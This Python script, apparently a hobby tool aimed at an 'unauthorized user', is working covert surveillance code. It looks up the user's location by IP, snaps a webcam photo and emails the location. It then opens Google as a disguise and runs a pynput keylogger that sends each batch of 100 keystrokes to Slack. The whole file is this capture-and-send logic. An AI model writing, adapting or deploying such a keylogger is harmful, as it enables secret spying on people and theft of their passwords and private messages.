from functions.get_ip import getLocation
from functions.take_picture import take_picture
from pynput.keyboard import Key, Listener
from functions.list_to_string import listToString
from functions.send_slack_message import send_slack_message
from functions.send_email import send_email
import webbrowser

count = 0
keysArray = []


def keyTyped(key):
    global keysArray
    global count
    count += 1
    if count != 100:
        keysArray.append(key)
    elif count == 100:
        # every 100 characters typed, send a slack notification stating what was typed
        msg_slack = listToString(keysArray)
        send_slack_message(msg_slack)
        count = 0
        keysArray = []


def escape(key):
    if key == Key.esc:
        return False


# grabs unauthorized user location
location = getLocation()
# takes picture via webcam (opencv)
take_picture()
# send message with location info to email address
message = location[0] + " " + location[1] + " " + location[2] + " " + location[3]
send_email(message)

# opens browser as normally
webbrowser.open("www.google.com")

# logs keys typed
with Listener(on_press=keyTyped, on_release=escape) as listener:
    listener.join()
